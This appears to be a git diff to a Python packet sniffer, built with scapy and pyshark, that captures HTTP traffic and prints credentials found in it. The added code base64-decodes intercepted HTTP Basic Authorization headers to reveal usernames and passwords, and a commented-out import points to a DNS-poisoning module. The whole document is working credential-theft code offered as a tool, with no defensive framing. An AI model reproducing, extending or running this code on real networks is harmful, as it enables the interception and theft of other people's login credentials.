@@ -1,9 +1,11 @@
 import pyshark
 import threading
+import base64
 
 from scapy.all import *
 from scapy.layers.http import HTTPRequest
 from scapy.layers.dns import DNSRR, DNS, IP, UDP
+
 
 # from dns_poisoning import process_dns_packet
 # from utils import thread_with_trace
@@ -46,13 +48,28 @@ def print_creds_from_packet(request_to_filter_out, printing_queue):
             extracted_creds = extract_creds(current_index, request_to_filter_out)
             printing_queue.put(f"{GREEN}[+] Found creds: {extracted_creds}{RESET}")
 
+def format_base64(creds_to_format):
+    print(creds_to_format.decode('utf-8')[6:])
+    return base64.b64decode(creds_to_format.decode('utf-8')[6:])
 
 def process_http_packet(local_packet, printing_queue, verbosity):
+    printing_queue.put(local_packet)
+
     url = local_packet[HTTPRequest].Host.decode() + local_packet[HTTPRequest].Path.decode()
     ip = local_packet[IP].src
     method = local_packet[HTTPRequest].Method.decode()
+
+
     if verbosity > 1:
         printing_queue.put(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        tcp_layer = local_packet.getlayer("TCP")
+        if tcp_layer:
+            http_request = local_packet.getlayer("HTTP Request")
+            if http_request:
+                auth = http_request
+                if auth:
+                    printing_queue.put(format_base64(auth.Authorization))
+
     if local_packet.haslayer(Raw) and method == "POST":
         if verbosity > 0:
             printing_queue.put(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
